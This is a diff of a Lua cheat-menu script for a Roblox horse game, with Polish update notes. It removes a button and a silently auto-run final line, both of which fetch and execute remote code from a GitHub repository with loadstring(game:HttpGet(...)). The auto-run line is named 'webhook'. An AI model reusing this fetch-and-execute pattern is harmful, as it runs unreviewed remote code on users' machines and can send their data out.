@@ -42,7 +42,7 @@ local Misc = Window:CreateTab("Misc", 8882612828) -- wow thearchy
 local Section = Misc:CreateSection("Mystery Scripts")
 
 
-local Paragraph = Tab:CreateParagraph({Title = "Last update 27/01/26", Content = "Ale my duzo wiemy o konikach yay"})
+local Paragraph = Tab:CreateParagraph({Title = "Last update 03/02/26", Content = "Autosell dziala ale trzeba otworzyc renifera przez autofarma okej"})
 
 local Section = Tab:CreateSection("One Island Farm")
 
@@ -105,13 +105,6 @@ local Button = Misc:CreateButton({
    end,
 })
 
-local Button = Misc:CreateButton({
-   Name = "Auto quick sale (open horse menu before running)",
-   Callback = function()
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/quicksale'))()
-   end,
-})
-
 local Divider = Misc:CreateDivider()
 
 local Button = Misc:CreateButton({
@@ -131,12 +124,4 @@ local Button = Misc:CreateButton({
 })
 
 
-
-
-
 Rayfield:LoadConfiguration()
-
-
-
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
